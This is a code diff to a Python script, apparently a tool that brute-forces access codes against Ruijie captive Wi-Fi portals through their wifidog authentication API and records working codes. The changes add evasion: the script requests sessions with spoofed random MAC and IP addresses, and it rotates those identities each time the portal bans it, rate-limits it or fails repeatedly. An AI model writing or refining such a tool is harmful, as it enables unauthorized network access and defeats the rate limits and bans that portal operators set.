@@ -1,5 +1,5 @@
 # =====================================================================
-# khant_v9.py - KHANT V9 (FIXED DASHBOARD + REAL-TIME TIMER + NO BUGS)
+# khant_v9.py - KHANT V9 (FINAL FIX + SESSION ROTATION)
 # PART 1
 # =====================================================================
 import os, time, random, string, json, asyncio, socket, threading, re, sys, uuid
@@ -25,9 +25,9 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 10        # Ban မခံရအောင် ၁၀ ခုပဲ ထားတယ်
-TIMEOUT = 5                   # Timeout ကို ၅ စက္ကန့်ထားတယ်
-SESSION_TTL = 280             # Ruijie sign expire ~300s
+CONCURRENCY_LIMIT = 10        # ဘန်းမခံရအောင် ၁၀ ခုပဲ
+TIMEOUT = 4                   
+SESSION_TTL = 280             
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = "/api/auth/wifidog"
@@ -278,7 +278,7 @@ def gen_code(mode, length, scan_method="random"):
                 return c
         return None
 
-# ---------- dashboard (FIXED LAYOUT) ----------
+# ---------- dashboard ----------
 def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                 speed, mac, ip, sess_stat, sess_id, total):
     progress = min(100.0, (tested/total)*100) if total else 0.0
@@ -340,9 +340,11 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     status = "Init"
     sess_stat = "NONE"
     sess_id = "--------"
-    real_mac, real_ip = get_real_mac_and_ip()
-    mac = real_mac
-    ip  = real_ip
+    
+    # ⚠️ Session ယူဖို့အတွက် အတု MAC/IP ကို အသုံးပြုမယ်
+    mac = generate_random_mac()
+    ip  = generate_random_ip()
+    
     sess = None
     sess_time = 0.0
     fail_count = 0
@@ -350,7 +352,6 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
     conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=False)
 
-    # Timer ကို ၁ စက္ကန့်တစ်ခါ အလုပ်လုပ်အောင် ဖန်တီးခြင်း
     async def timer_task():
         while True:
             elapsed = time.time() - start
@@ -373,7 +374,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             while True:
                 if sess is None or (time.time() - sess_time) > SESSION_TTL:
                     status = "Fetching session…"
-                    tag, payload = await fetch_real_session(session, gw_params, real_mac, real_ip)
+                    # ⚠️ ဒီမှာ mac နဲ့ ip (အတု) ကို သုံးပြီး ယူမယ်
+                    tag, payload = await fetch_real_session(session, gw_params, mac, ip)
                     
                     if tag == "REAL":
                         sess = payload
@@ -385,8 +387,10 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         fail_count = 0
                     elif tag == "BAN":
                         sess_stat = "BANNED"; sess = None
-                        status = "IP Banned. Wait…"
-                        await asyncio.sleep(10)
+                        status = "IP Banned. Rotating…"
+                        mac = generate_random_mac()
+                        ip = generate_random_ip()
+                        await asyncio.sleep(5)
                         continue
                     else:
                         sess_stat = "FAIL"; sess = None
@@ -394,6 +398,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         fail_count += 1
                         if fail_count >= 3:
                             status = "Wi-Fi ကို Browser နဲ့ အရင်ဝင်ပါ"
+                            # Ban မခံရအောင် အတု MAC/IP အသစ် ပြောင်းမယ်
+                            mac = generate_random_mac()
+                            ip = generate_random_ip()
                             await asyncio.sleep(5)
                             fail_count = 0
                         else:
@@ -436,6 +443,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         refresh_session = True; sess_stat = "EXPIRED"; break
                     if res == "__RATE_LIMITED__":
                         refresh_session = True; sess_stat = "BANNED"; status = "429 → rotate"
+                        mac = generate_random_mac()
+                        ip = generate_random_ip()
                         await asyncio.sleep(2); break
                     if res.startswith("__"): continue
 
